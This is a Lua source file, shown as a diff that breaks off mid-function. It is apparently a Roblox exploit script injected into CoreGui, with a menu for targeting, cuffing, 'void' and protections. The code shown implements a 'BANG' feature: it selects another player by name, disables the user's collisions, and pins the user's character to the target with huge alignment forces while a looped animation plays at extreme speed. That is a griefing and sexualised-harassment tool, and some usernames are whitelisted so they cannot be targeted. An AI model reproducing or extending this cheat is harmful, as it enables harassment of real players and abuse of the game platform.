@@ -1,0 +1,2035 @@
+local contextActionService = game:GetService("ContextActionService")
+local players = game:GetService("Players")
+local tweenService = game:GetService("TweenService")
+local userInputService = game:GetService("UserInputService")
+local coreGui = game:GetService("CoreGui")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local runService = game:GetService("RunService")
+local localPlayer = players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+game:FindService("TextChatService")
+local v1, v2 = pcall(function()
+    local TweenService = game:GetService("TweenService")
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "AbuAtbMessage"
+gui.ResetOnSpawn = false
+gui.Parent = game:GetService("CoreGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 280, 0, 80)
+frame.Position = UDim2.new(0.5, -140, -0.15, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -10, 0, 30)
+title.Position = UDim2.new(0, 5, 0, 5)
+title.BackgroundTransparency = 1
+title.Text = "~رساله من ابو عتب~"
+title.TextColor3 = Color3.fromRGB(180, 0, 0)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.Parent = frame
+
+local msg = Instance.new("TextLabel")
+msg.Size = UDim2.new(1, -10, 0, 30)
+msg.Position = UDim2.new(0, 5, 0, 40)
+msg.BackgroundTransparency = 1
+msg.Text = "😉لاوصيك بل جدد"
+msg.TextColor3 = Color3.fromRGB(255, 255, 255)
+msg.Font = Enum.Font.Gotham
+msg.TextSize = 14
+msg.Parent = frame
+
+-- دخول خفيف من فوق
+local inTween = TweenService:Create(
+	frame,
+	TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+	{Position = UDim2.new(0.5, -140, 0.03, 0)}
+)
+
+-- خروج لفوق
+local outTween = TweenService:Create(
+	frame,
+	TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+	{Position = UDim2.new(0.5, -140, -0.15, 0)}
+)
+
+inTween:Play()
+
+task.delay(2, function()
+	outTween:Play()
+	task.delay(0.5, function()
+		gui:Destroy()
+	end)
+end)
+end
+)
+if v1 then
+    print("تم تحميل السكربت الخارجي بنجاح")
+else
+    warn("فشل تحميل السكربت الخارجي: "..tostring(v2))
+end
+local topSquare = Instance.new("ScreenGui")
+topSquare.Name = "TopSquare"
+topSquare.ResetOnSpawn =  false
+topSquare.ZIndexBehavior = Enum.ZIndexBehavior.Global
+topSquare.Parent = coreGui
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 40, 0, 40)
+frame.Position = UDim2.new(0, 120, 0, 120)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Active =  true
+frame.ZIndex = 100000
+frame.Parent = topSquare
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Text = "Zm"
+textLabel.TextColor3 = Color3.fromRGB(139, 0, 0)
+textLabel.Font = Enum.Font.GothamBold
+textLabel.TextSize = 16
+textLabel.ZIndex = 100001
+textLabel.Parent = frame
+local v3 =  false
+local vector = Vector2.new(0, 0)
+local vector2 = Vector2.new(0, 0)
+local v4 =  false
+local v5 = 0
+local v6 = 0.3
+local f1
+local function f2(p1)
+    if p1.UserInputType == Enum.UserInputType.MouseButton1 then
+        if frame:GetAttribute("MouseDownInside") then
+            v3 =  true
+            vector = p1.Position
+            vector2 = Vector2.new(frame.AbsolutePosition.X, frame.AbsolutePosition.Y)
+            contextActionService:BindAction("DragBlockCamera", f1,  false, Enum.UserInputType.Touch, Enum.UserInputType.MouseMovement)
+        end
+    elseif p1.UserInputType == Enum.UserInputType.Touch then
+        local v7 = tick()
+        if frame:GetAttribute("TouchDownInside") then
+            if v7 - v5 > v6 then
+                v3 =  true
+                vector = p1.Position
+                vector2 = Vector2.new(frame.AbsolutePosition.X, frame.AbsolutePosition.Y)
+                v5 = v7
+                contextActionService:BindAction("DragBlockCamera", f1,  false, Enum.UserInputType.Touch, Enum.UserInputType.MouseMovement)
+            end
+        end
+    end
+end
+function f1()
+    return Enum.ContextActionResult.Sink
+end
+local function f3()
+    v3 =  false
+    v4 =  false
+    frame:SetAttribute("MouseDownInside",  false)
+    frame:SetAttribute("TouchDownInside",  false)
+    contextActionService:UnbindAction("DragBlockCamera")
+end
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        v4 =  true
+        frame:SetAttribute("MouseDownInside",  true)
+        f2(input)
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                f3()
+            end
+        end
+)
+    elseif input.UserInputType == Enum.UserInputType.Touch then
+        frame:SetAttribute("TouchDownInside",  true)
+        f2(input)
+    end
+end
+)
+frame.InputEnded:Connect(function(input2)
+    if input2.UserInputType == Enum.UserInputType.MouseButton1 or input2.UserInputType == Enum.UserInputType.Touch then
+        f3()
+    end
+end
+)
+userInputService.InputChanged:Connect(function(input3)
+    if v3 and(input3.UserInputType == Enum.UserInputType.MouseMovement or input3.UserInputType == Enum.UserInputType.Touch) then
+        if input3.UserInputType == Enum.UserInputType.MouseMovement and v4 or input3.UserInputType == Enum.UserInputType.Touch and frame:GetAttribute("TouchDownInside") then
+            local v8 = input3.Position - vector
+            frame.Position = UDim2.new(0, vector2.X + v8.X, 0, vector2.Y + v8.Y)
+        else
+            f3()
+        end
+    end
+end
+)
+frame.MouseLeave:Connect(function()
+    if not userInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
+        f3()
+    end
+end
+)
+local vector3 = Vector2.new(460, 340)
+Color3.fromRGB(0, 0, 0)
+local color = Color3.fromRGB(0, 0, 0)
+local color2 = Color3.fromRGB(139, 0, 0)
+Color3.fromRGB(139, 0, 0)
+local function f4(p2)
+    local v9 =  false
+    local vector4 = Vector3.new(0, 0, 0)
+    local vector5 = Vector3.new(0, 0, 0)
+    local function f5(p3)
+        local v10 = p3.Position - vector4
+        UDim2.new(0, vector5.X + v10.X, 0, vector5.Y + v10.Y)
+        local viewportSize = game.Workspace.CurrentCamera.ViewportSize
+        local absoluteSize = p2.AbsoluteSize
+        local v11 = math.clamp(vector5.X + v10.X, 0, viewportSize.X - absoluteSize.X)
+        p2.Position = UDim2.new(0, v11, 0, math.clamp(vector5.Y + v10.Y, 0, viewportSize.Y - absoluteSize.Y))
+    end
+    p2.InputBegan:Connect(function(input4)
+        if input4.UserInputType == Enum.UserInputType.MouseButton1 or input4.UserInputType == Enum.UserInputType.Touch then
+            v9 =  true
+            vector4 = input4.Position
+            vector5 = Vector3.new(p2.AbsolutePosition.X, p2.AbsolutePosition.Y, 0)
+            input4.Changed:Connect(function()
+                if input4.UserInputState == Enum.UserInputState.End then
+                    v9 =  false
+                end
+            end
+)
+        end
+    end
+)
+    local v12
+    p2.InputChanged:Connect(function(input5)
+        if input5.UserInputType == Enum.UserInputType.MouseMovement or input5.UserInputType == Enum.UserInputType.Touch then
+            v12 = input5
+        end
+    end
+)
+    userInputService.InputChanged:Connect(function(input6)
+        if v9 and input6 == v12 then
+            f5(input6)
+        end
+    end
+)
+end
+local circularToggleMenu = Instance.new("ScreenGui")
+circularToggleMenu.Name = "CircularToggleMenu"
+circularToggleMenu.ResetOnSpawn =  false
+circularToggleMenu.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+circularToggleMenu.Enabled =  false
+circularToggleMenu.Parent = playerGui
+local frame2 = Instance.new("Frame")
+frame2.Size = UDim2.new(0, vector3.X, 0, vector3.Y)
+frame2.Position = UDim2.new(0.5,  - vector3.X / 2, 0.5,  - vector3.Y / 2)
+frame2.BackgroundColor3 = color
+frame2.Visible =  false
+frame2.ClipsDescendants =  true
+frame2.ZIndex = 1000
+frame2.Parent = circularToggleMenu
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 12)
+uiCorner.Parent = frame2
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Thickness = 3
+uiStroke.Color = Color3.fromRGB(40, 40, 40)
+uiStroke.Parent = frame2
+local uiGradient = Instance.new("UIGradient")
+uiGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0,
+    Color3.fromRGB(0,
+    0,
+    0)),
+    ColorSequenceKeypoint.new(1,
+    Color3.fromRGB(0,
+    0,
+    0)),
+}
+)
+uiGradient.Rotation = 45
+uiGradient.Parent = frame2
+local frame3 = Instance.new("Frame")
+frame3.Size = UDim2.new(1, 0, 0, 36)
+frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame3.BorderSizePixel = 0
+frame3.ZIndex = 1001
+frame3.Parent = frame2
+local uiCorner2 = Instance.new("UICorner")
+uiCorner2.CornerRadius = UDim.new(0, 12)
+uiCorner2.Parent = frame3
+local textLabel2 = Instance.new("TextLabel")
+textLabel2.Size = UDim2.new(1, 0, 1, 0)
+textLabel2.BackgroundTransparency = 1
+textLabel2.Text = "سكربت ابو عتب"
+textLabel2.Font = Enum.Font.GothamBold
+textLabel2.TextSize = 18
+textLabel2.TextColor3 = color2
+textLabel2.TextStrokeTransparency = 0.8
+textLabel2.ZIndex = 1002
+textLabel2.Parent = frame3
+local frame4 = Instance.new("Frame")
+frame4.Size = UDim2.new(0, 110, 1,  - 40)
+frame4.Position = UDim2.new(0, 0, 0, 40)
+frame4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame4.ZIndex = 1001
+frame4.Parent = frame2
+local uiCorner3 = Instance.new("UICorner")
+uiCorner3.CornerRadius = UDim.new(0, 8)
+uiCorner3.Parent = frame4
+local uiStroke2 = Instance.new("UIStroke")
+uiStroke2.Thickness = 2
+uiStroke2.Color = Color3.fromRGB(30, 30, 30)
+uiStroke2.Parent = frame4
+local uiListLayout = Instance.new("UIListLayout")
+uiListLayout.Padding = UDim.new(0, 6)
+uiListLayout.FillDirection = Enum.FillDirection.Vertical
+uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
+uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+uiListLayout.Parent = frame4
+local function f6(name, text)
+    local textButton = Instance.new("TextButton")
+    textButton.Name = name
+    textButton.Size = UDim2.new(0.9, 0, 0, 42)
+    textButton.Text = text
+    textButton.Font = Enum.Font.GothamBold
+    textButton.TextSize = 14
+    textButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    textButton.TextColor3 = color2
+    textButton.AutoButtonColor =  true
+    textButton.ZIndex = 1002
+    local uiCorner4 = Instance.new("UICorner")
+    uiCorner4.CornerRadius = UDim.new(0, 8)
+    uiCorner4.Parent = textButton
+    local uiStroke3 = Instance.new("UIStroke")
+    uiStroke3.Thickness = 2
+    uiStroke3.Color = Color3.fromRGB(40, 40, 40)
+    uiStroke3.Parent = textButton
+    textButton.Parent = frame4
+    return textButton
+end
+local button = f6("target", "الاستهداف")
+local button2 = f6("protect", "حمايه نسخ")
+local button3 = f6("cuff", "الكلبشه")
+local button4 = f6("protections", "الحمايات")
+local button5 = f6("void", "فويد")
+local function f7()
+    local scrollingFrame = Instance.new("ScrollingFrame")
+    scrollingFrame.Size = UDim2.new(1,  - 120, 1,  - 52)
+    scrollingFrame.Position = UDim2.new(0, 116, 0, 46)
+    scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    scrollingFrame.BackgroundTransparency = 1
+    scrollingFrame.ScrollBarThickness = 4
+    scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 60)
+    scrollingFrame.Visible =  false
+    scrollingFrame.ZIndex = 1001
+    scrollingFrame.Parent = frame2
+    local uiListLayout2 = Instance.new("UIListLayout")
+    uiListLayout2.Padding = UDim.new(0, 8)
+    uiListLayout2.Parent = scrollingFrame
+    return scrollingFrame
+end
+local v13 = f7()
+local v14 = f7()
+local v15 = f7()
+local v16 = f7()
+local v17 = f7()
+local v18 = {
+    target = {
+        button = button,
+        frame = v13
+    },
+    protect = {
+        button = button2,
+        frame = v14
+    },
+    cuff = {
+        button = button3,
+        frame = v15
+    },
+    protections = {
+        button = button4,
+        frame = v16
+    },
+    void = {
+        button = button5,
+        frame = v17
+    },
+}
+local function f8(p4)
+    for key, value in pairs(v18) do
+        local v19 = key == p4
+        value.frame.Visible = v19
+        if v19 then
+            value.button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            value.button.TextColor3 = Color3.fromRGB(139, 0, 0)
+        else
+            value.button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            value.button.TextColor3 = color2
+        end
+    end
+end
+for key2, value2 in pairs(v18) do
+    local v20 = key2
+    value2.button.MouseButton1Click:Connect(function()
+        f8(v20)
+    end
+)
+end
+f8("target")
+local v21 =  false
+local function f9()
+    if v21 then
+        return
+    end
+    v21 =  true
+    circularToggleMenu.Enabled =  true
+    frame2.Visible =  true
+    frame2.Size = UDim2.new(0, 0, 0, 0)
+    frame2.Position = UDim2.new(0, frame.AbsolutePosition.X, 0, frame.AbsolutePosition.Y)
+    tweenService:Create(frame2, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0,
+        vector3.X,
+        0,
+        vector3.Y),
+        Position = UDim2.new(0.5,
+        -         vector3.X / 2,
+        0.5,
+        -         vector3.Y / 2),
+    }
+):Play()
+    textLabel.TextColor3 = Color3.fromRGB(0, 180, 0)
+end
+local function f10()
+    if not v21 then
+        return
+    end
+    v21 =  false
+    tweenService:Create(frame2, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        Size = UDim2.new(0,
+        0,
+        0,
+        0),
+        Position = UDim2.new(0,
+        frame.AbsolutePosition.X,
+        0,
+        frame.AbsolutePosition.Y),
+    }
+):Play()
+    task.delay(0.2, function()
+        frame2.Visible =  false
+        circularToggleMenu.Enabled =  false
+        textLabel.TextColor3 = Color3.fromRGB(139, 0, 0)
+    end
+)
+end
+local v22 = 0
+frame.InputBegan:Connect(function(input7)
+    if input7.UserInputType == Enum.UserInputType.MouseButton1 or input7.UserInputType == Enum.UserInputType.Touch then
+        v22 = tick()
+    end
+end
+)
+frame.InputEnded:Connect(function(input8)
+    if input8.UserInputType == Enum.UserInputType.MouseButton1 or input8.UserInputType == Enum.UserInputType.Touch then
+        if tick() - v22 < 0.2 and not v3 then
+            if v21 then
+                f10()
+            else
+                f9()
+            end
+        end
+    end
+end
+)
+f4(frame2)
+v13:ClearAllChildren()
+local v23 = {
+    Zmmkb511 =  true,
+    ["4YB_V"] =  true,
+    ["98R_v"] =  true,
+    ["7_ccc0"] =  true,
+    MayBeReckl =  true,
+    Znfirh84 =  true,
+}
+local frame5 = Instance.new("Frame")
+frame5.Size = UDim2.new(1,  - 10, 0, 220)
+local function f11(p5)
+    if not p5 then
+        return nil
+    end
+    for index, value3 in ipairs(players:GetPlayers()) do
+        if value3.Name == p5 or value3.DisplayName == p5 then
+            return value3
+        end
+    end
+    return nil
+end
+frame5.Position = UDim2.new(0, 5, 0, 5)
+frame5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame5.Active =  true
+frame5.ZIndex = 1002
+frame5.Parent = v13
+local uiCorner5 = Instance.new("UICorner")
+uiCorner5.CornerRadius = UDim.new(0, 10)
+uiCorner5.Parent = frame5
+local uiStroke4 = Instance.new("UIStroke")
+uiStroke4.Thickness = 2
+uiStroke4.Color = Color3.fromRGB(60, 0, 0)
+uiStroke4.Parent = frame5
+local textLabel3 = Instance.new("TextLabel")
+textLabel3.Text = "الاستهداف"
+textLabel3.Size = UDim2.new(1, 0, 0, 24)
+textLabel3.Position = UDim2.new(0, 0, 0, 4)
+textLabel3.BackgroundTransparency = 1
+textLabel3.TextColor3 = Color3.fromRGB(139, 0, 0)
+textLabel3.Font = Enum.Font.GothamBold
+textLabel3.TextSize = 16
+textLabel3.ZIndex = 1003
+textLabel3.Parent = frame5
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(1,  - 12, 0, 28)
+textBox.Position = UDim2.new(0, 6, 0, 32)
+textBox.PlaceholderText = "اسم الهدف - اكتب حرفين للاقتراحات"
+textBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textBox.TextColor3 = Color3.fromRGB(139, 0, 0)
+textBox.ClearTextOnFocus =  true
+textBox.Font = Enum.Font.Gotham
+textBox.TextSize = 13
+textBox.ZIndex = 1003
+textBox.Parent = frame5
+local uiCorner6 = Instance.new("UICorner")
+uiCorner6.CornerRadius = UDim.new(0, 6)
+uiCorner6.Parent = textBox
+local textLabel4 = Instance.new("TextLabel")
+textLabel4.Text = "اكتب حرفين واختاره ومبروك"
+textLabel4.Size = UDim2.new(0, 180, 0, 18)
+textLabel4.Position = UDim2.new(0, 6, 0, 66)
+textLabel4.BackgroundTransparency = 1
+textLabel4.TextColor3 = Color3.fromRGB(139, 0, 0)
+textLabel4.Font = Enum.Font.Gotham
+textLabel4.TextSize = 12
+textLabel4.TextXAlignment = Enum.TextXAlignment.Left
+textLabel4.ZIndex = 1003
+textLabel4.Parent = frame5
+local textLabel5 = Instance.new("TextLabel")
+textLabel5.Text = ""
+textLabel5.Size = UDim2.new(0, 180, 0, 18)
+textLabel5.Position = UDim2.new(0, 6, 0, 86)
+textLabel5.BackgroundTransparency = 1
+textLabel5.TextColor3 = Color3.fromRGB(139, 0, 0)
+textLabel5.Font = Enum.Font.Gotham
+textLabel5.TextSize = 12
+textLabel5.TextXAlignment = Enum.TextXAlignment.Left
+textLabel5.ZIndex = 1003
+textLabel5.Parent = frame5
+local frame6 = Instance.new("Frame")
+local function f12(p6)
+    local v24 = {
+    }
+    local v25 = string.lower(p6)
+    for index2, value4 in ipairs(players:GetPlayers()) do
+        if value4 ~= localPlayer then
+            local v26 = string.lower(value4.Name)
+            local v27 = string.lower(value4.DisplayName or "")
+            if string.sub(v26, 1,  # v25) == v25 or v27 ~= "" and string.sub(v27, 1,  # v25) == v25 then
+                table.insert(v24, {
+                    name = value4.Name,
+                    display = value4.DisplayName,
+                    userId = value4.UserId,
+                }
+)
+            end
+        end
+    end
+    table.sort(v24, function(p7, p8)
+        return string.lower(p7.name) < string.lower(p8.name)
+    end
+)
+    return v24
+end
+frame6.Size = UDim2.new(0, 80, 0, 80)
+frame6.Position = UDim2.new(0, 6, 0, 110)
+frame6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame6.BorderSizePixel = 0
+frame6.ZIndex = 1002
+frame6.Parent = frame5
+local uiCorner7 = Instance.new("UICorner")
+uiCorner7.CornerRadius = UDim.new(0, 6)
+uiCorner7.Parent = frame6
+local uiStroke5 = Instance.new("UIStroke")
+uiStroke5.Thickness = 2
+uiStroke5.Color = Color3.fromRGB(60, 60, 60)
+uiStroke5.Parent = frame6
+local imageLabel = Instance.new("ImageLabel")
+imageLabel.Size = UDim2.new(1,  - 4, 1,  - 4)
+imageLabel.Position = UDim2.new(0, 2, 0, 2)
+imageLabel.BackgroundTransparency = 1
+imageLabel.Image = "rbxassetid://0"
+imageLabel.ScaleType = Enum.ScaleType.Fit
+imageLabel.ZIndex = 1003
+imageLabel.Parent = frame6
+local textButton2 = Instance.new("TextButton")
+textButton2.Text = "BANG"
+textButton2.Size = UDim2.new(0.35,  - 6, 0, 26)
+textButton2.Position = UDim2.new(0.63, 6, 0, 66)
+textButton2.BackgroundColor3 = Color3.fromRGB(0, 80, 0)
+textButton2.TextColor3 = Color3.new(1, 1, 1)
+textButton2.Font = Enum.Font.GothamBold
+textButton2.TextSize = 13
+textButton2.ZIndex = 1003
+textButton2.Parent = frame5
+local uiCorner8 = Instance.new("UICorner")
+uiCorner8.CornerRadius = UDim.new(0, 6)
+uiCorner8.Parent = textButton2
+local textButton3 = Instance.new("TextButton")
+textButton3.Text = "FACE BANG"
+textButton3.Size = UDim2.new(0.35,  - 6, 0, 26)
+textButton3.Position = UDim2.new(0.63, 6, 0, 98)
+textButton3.BackgroundColor3 = Color3.fromRGB(0, 80, 0)
+textButton3.TextColor3 = Color3.new(1, 1, 1)
+textButton3.Font = Enum.Font.GothamBold
+textButton3.TextSize = 13
+textButton3.ZIndex = 1003
+textButton3.Parent = frame5
+local uiCorner9 = Instance.new("UICorner")
+uiCorner9.CornerRadius = UDim.new(0, 6)
+uiCorner9.Parent = textButton3
+local v28 =  false
+local v29 =  false
+local v30 =  true
+local v31 = {
+}
+local v32 = "اكتب حرفين واختاره ومبروك"
+local v33 = ""
+local v34 =  false
+local function f13(p9)
+    if not p9 then
+        return
+    end
+    for key3, value5 in pairs(p9:GetChildren()) do
+        local v35 = value5
+        if v35.Name == "BANGAlignPosition" or v35.Name == "BANGAlignOrientation" or v35.Name == "BANGAttachment" or v35.Name == "BANGTargetAttachment" then
+            pcall(function()
+                v35:Destroy()
+            end
+)
+        end
+    end
+end
+local loadAnimation
+local function f14()
+    if loadAnimation then
+        pcall(function()
+            loadAnimation:Stop()
+        end
+)
+    end
+    loadAnimation =  nil
+end
+local function f15()
+    textLabel4.Text = v32 or "اكتب حرفين واختاره ومبروك"
+    textLabel5.Text = v33 or ""
+end
+local function f16()
+    for key4, value6 in pairs(v31) do
+        local v36 = key4
+        local canCollide = value6
+        if v36 and v36.Parent then
+            pcall(function()
+                v36.CanCollide = canCollide
+            end
+)
+        end
+    end
+    v31 = {
+    }
+end
+local function f17(p10)
+    return v23[p10] ==  true
+end
+local function f18(p11, p12)
+    if not p11 or not p12 then
+        return false
+    else
+        f13(p11)
+        local bangAttachment = Instance.new("Attachment")
+        bangAttachment.Name = "BANGAttachment"
+        bangAttachment.Parent = p11
+        local bangTargetAttachment = Instance.new("Attachment")
+        bangTargetAttachment.Name = "BANGTargetAttachment"
+        bangTargetAttachment.Parent = p12
+        bangTargetAttachment.Position = Vector3.new(0, 0, 1)
+        local bangAlignPosition = Instance.new("AlignPosition")
+        bangAlignPosition.Name = "BANGAlignPosition"
+        bangAlignPosition.Parent = p11
+        bangAlignPosition.Attachment0 = bangAttachment
+        bangAlignPosition.Attachment1 = bangTargetAttachment
+        bangAlignPosition.MaxForce = 9000000159744
+        bangAlignPosition.Responsiveness = 500
+        bangAlignPosition.ReactionForceEnabled =  false
+        local bangAlignOrientation = Instance.new("AlignOrientation")
+        bangAlignOrientation.Name = "BANGAlignOrientation"
+        bangAlignOrientation.Parent = p11
+        bangAlignOrientation.Attachment0 = bangAttachment
+        bangAlignOrientation.Attachment1 = bangTargetAttachment
+        bangAlignOrientation.MaxTorque = 9000000159744
+        bangAlignOrientation.Responsiveness = 500
+        bangAlignOrientation.ReactionTorqueEnabled =  false
+        return true
+    end
+end
+local function f19()
+    f14()
+    if not localPlayer.Character then
+        return
+    else
+        local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if not humanoid then
+            return
+        else
+            local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
+            local animation = Instance.new("Animation")
+            animation.AnimationId = "rbxassetid://"..(humanoid.RigType == Enum.HumanoidRigType.R6 and "148840371" or "5918726674")
+            loadAnimation = animator:LoadAnimation(animation)
+            loadAnimation.Looped =  true
+            pcall(function()
+                loadAnimation:Play()
+            end
+)
+            if humanoid.RigType == Enum.HumanoidRigType.R6 then
+                pcall(function()
+                    loadAnimation:AdjustSpeed(4)
+                end
+)
+            else
+                pcall(function()
+                    loadAnimation:AdjustSpeed(9999999)
+                end
+)
+            end
+            return
+        end
+    end
+end
+local f20
+local function f21(p13)
+    if not p13 or p13 == localPlayer then
+        return
+    end
+    if not p13.Character or not localPlayer.Character then
+        return
+    else
+        local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local character = p13.Character
+        local v37 =  not humanoidRootPart
+        local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")
+        if v37 or not humanoidRootPart2 then
+            return
+        end
+        f20()
+        f18(humanoidRootPart, humanoidRootPart2)
+        f19()
+        v28 =  true
+        textButton2.Text = "UNBANG"
+        textButton2.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+        return
+    end
+end
+function f20()
+    if not localPlayer.Character then
+        return
+    end
+    for key5, value7 in pairs(localPlayer.Character:GetDescendants()) do
+        local v38 = value7
+        if v38:IsA("BasePart") then
+            if v31[v38] ==  nil then
+                v31[v38] = v38.CanCollide
+            end
+            pcall(function()
+                v38.CanCollide =  false
+            end
+)
+        end
+    end
+end
+local function f22()
+    if localPlayer.Character then
+        local humanoidRootPart3 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if humanoidRootPart3 then
+            f13(humanoidRootPart3)
+        end
+    end
+    f14()
+    f16()
+    v28 =  false
+    textButton2.Text = "BANG"
+    textButton2.BackgroundColor3 = Color3.fromRGB(0, 80, 0)
+end
+local f23
+local function f24(p14)
+    local v39 =  not p14 or p14 == ""
+    local v40
+    if v39 then
+        f23()
+        return
+    else
+        local v41 = f11(p14)
+        if not v41 then
+            local v42
+            v42, v40 = pcall(function()
+                return players:GetUserIdFromNameAsync(p14)
+            end
+)
+            if v42 and v40 then
+                v32 = "الاسم: "..tostring(p14)
+                textLabel4.TextColor3 = Color3.fromRGB(139, 0, 0)
+                v33 = "الايدي: "..tostring(v40)
+                f15()
+                pcall(function()
+                    imageLabel.Image = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", v40)
+                end
+)
+                return
+            end
+            f23()
+            return
+        end
+        v32 = "الاسم: "..(v41.DisplayName and tostring(v41.DisplayName) ~= "" and tostring(v41.DisplayName) or tostring(v41.Name))
+        textLabel4.TextColor3 = Color3.fromRGB(139, 0, 0)
+        v33 = "الايدي: "..tostring(v41.UserId)
+        f15()
+        return
+    end
+end
+function f23()
+    v32 = "اكتب حرفين واختاره ومبروك"
+    textLabel4.TextColor3 = Color3.fromRGB(139, 0, 0)
+    v33 = ""
+    imageLabel.Image = "rbxassetid://0"
+    f15()
+end
+local f25
+local function f26()
+    local v43 = tostring(textBox.Text or "")
+    if # v43 < 1 then
+        return
+    else
+        local v44 = f12(v43)
+        if # v44 == 0 then
+            for index3, value8 in ipairs(frame5:GetChildren()) do
+                if value8.Name == "AutoCompleteItem" then
+                    value8:Destroy()
+                end
+            end
+            return
+        end
+        if # v44 == 1 then
+            textBox.Text = v44[1].name
+            f24(v44[1].name)
+            for index4, value9 in ipairs(frame5:GetChildren()) do
+                if value9.Name == "AutoCompleteItem" then
+                    value9:Destroy()
+                end
+            end
+        else
+            f25(v44)
+        end
+        return
+    end
+end
+function f25(p15)
+    for index5, value10 in ipairs(frame5:GetChildren()) do
+        if value10.Name == "AutoCompleteItem" then
+            value10:Destroy()
+        end
+    end
+    if # p15 == 0 then
+        return
+    else
+        local v45 = 62
+        for index6, value11 in ipairs(p15) do
+            local v46 = 5
+            local v47 = value11
+            if index6 > v46 then
+                break
+            else
+                local autoCompleteItem = Instance.new("TextButton")
+                autoCompleteItem.Name = "AutoCompleteItem"
+                autoCompleteItem.Size = UDim2.new(1,  - 12, 0, 24)
+                autoCompleteItem.Position = UDim2.new(0, 6, 0, v45)
+                autoCompleteItem.Text = v47.display ~= v47.name and v47.display.. " (@"..v47.name.. ")" or v47.name
+                autoCompleteItem.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                autoCompleteItem.TextColor3 = Color3.fromRGB(139, 0, 0)
+                autoCompleteItem.Font = Enum.Font.GothamBold
+                autoCompleteItem.TextSize = 12
+                autoCompleteItem.TextXAlignment = Enum.TextXAlignment.Left
+                autoCompleteItem.ZIndex = 1004
+                autoCompleteItem.Parent = frame5
+                local uiCorner10 = Instance.new("UICorner")
+                uiCorner10.CornerRadius = UDim.new(0, 4)
+                uiCorner10.Parent = autoCompleteItem
+                autoCompleteItem.MouseEnter:Connect(function()
+                    tweenService:Create(autoCompleteItem, TweenInfo.new(0.2), {
+                        BackgroundColor3 = Color3.fromRGB(60,
+                        60,
+                        60),
+                        TextColor3 = Color3.fromRGB(139,
+                        0,
+                        0),
+                    }
+):Play()
+                end
+)
+                autoCompleteItem.MouseLeave:Connect(function()
+                    tweenService:Create(autoCompleteItem, TweenInfo.new(0.2), {
+                        BackgroundColor3 = Color3.fromRGB(0,
+                        0,
+                        0),
+                        TextColor3 = Color3.fromRGB(139,
+                        0,
+                        0),
+                    }
+):Play()
+                end
+)
+                autoCompleteItem.MouseButton1Click:Connect(function()
+                    textBox.Text = v47.name
+                    f24(v47.name)
+                    for index7, value12 in ipairs(frame5:GetChildren()) do
+                        if value12.Name == "AutoCompleteItem" then
+                            value12:Destroy()
+                        end
+                    end
+                end
+)
+                v45 = v45 + 26
+            end
+        end
+        return
+    end
+end
+textBox:GetPropertyChangedSignal("Text"):Connect(function()
+    local v48 = tostring(textBox.Text or "")
+    if v48 == "" then
+        f23()
+        for index8, value13 in ipairs(frame5:GetChildren()) do
+            if value13.Name == "AutoCompleteItem" then
+                value13:Destroy()
+            end
+        end
+        return
+    end
+    if f17(v48) then
+        return
+    end
+    if # v48 >= 2 then
+        f26()
+    else
+        for index9, value14 in ipairs(frame5:GetChildren()) do
+            if value14.Name == "AutoCompleteItem" then
+                value14:Destroy()
+            end
+        end
+    end
+    f24(v48)
+end
+)
+textBox.FocusLost:Connect(function(p16)
+    if p16 then
+        f26()
+    end
+end
+)
+local v49
+local function f27(p17)
+    if not p17 or p17 == "" then
+        return
+    end
+    if f17(p17) then
+        return
+    end
+    if not v29 then
+        v49 = p17
+        v29 =  true
+        textButton2.Text = "UNBANG"
